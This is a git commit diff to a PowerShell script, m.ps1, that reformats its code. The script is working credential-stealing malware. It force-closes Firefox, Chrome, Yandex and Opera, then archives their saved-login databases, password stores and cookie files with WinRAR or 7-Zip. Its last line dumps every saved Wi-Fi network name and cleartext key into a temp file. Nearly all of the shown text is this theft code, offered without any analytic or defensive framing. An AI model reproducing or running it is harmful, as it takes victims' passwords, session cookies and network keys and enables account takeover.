9a6a675f1bb4cc88498f4281266e8c2b5dd4edb9
lol_are_you_gay <50666295+Kirill2045@users.noreply.github.com>
2021-07-28 14:23:36 +0300

    Update m.ps1

--- m.ps1
+++ m.ps1
@@ -6,29 +6,45 @@ if(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe")
 elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
   {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
 
-$f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");if(Test-Path -Path $f){Stop-Process -Name firefox -ErrorAction SilentlyContinue;
-if("WinRAR"-in $arh)
-  {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip" -in $arh)
-  {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}}else{echo "asd"}
+$f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
+if(Test-Path -Path $f)
+  {Stop-Process -Name firefox -ErrorAction SilentlyContinue;
+  if("WinRAR"-in $arh)
+    {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+  elseif("7-Zip" -in $arh)
+    {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}
+}
+else{echo "Masd"}
 
-$g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");if(Test-Path -Path $g){Stop-Process -Name chrome -ErrorAction SilentlyContinue;
-if("WinRAR"-in $arh)
-  {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip" -in $arh)
-  {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}}else{echo "asd"}
+$g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");
+if(Test-Path -Path $g){
+  Stop-Process -Name chrome -ErrorAction SilentlyContinue;
+  if("WinRAR"-in $arh)
+    {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+  elseif("7-Zip" -in $arh)
+    {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}
+}
+else{echo "Gasd"}
 
-$y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");if(Test-Path -Path $y){Stop-Process -Name browser -ErrorAction SilentlyContinue;
-if("WinRAR" -in $arh)
-  {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip"-in $arh)
-  {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}}else{echo "asd"}
+$y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");
+if(Test-Path -Path $y){
+  Stop-Process -Name browser -ErrorAction SilentlyContinue;
+  if("WinRAR" -in $arh)
+    {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+  elseif("7-Zip"-in $arh)
+    {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}
+}
+else{echo "Yasd"}
 
-$o=($env:APPDATA+"\Opera Software\Opera Stable\");if(Test-Path -Path $o){Stop-Process -Name browser -ErrorAction SilentlyContinue;
-if("WinRAR" -in $arh)
-  {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip"-in $arh)
-  {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}}else{echo "asd"}
+$o=($env:APPDATA+"\Opera Software\Opera Stable\");
+if(Test-Path -Path $o){
+  Stop-Process -Name browser -ErrorAction SilentlyContinue;
+  if("WinRAR" -in $arh)
+    {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+  elseif("7-Zip"-in $arh)
+    {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}
+}
+else{echo "Oasd"}
 
 
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
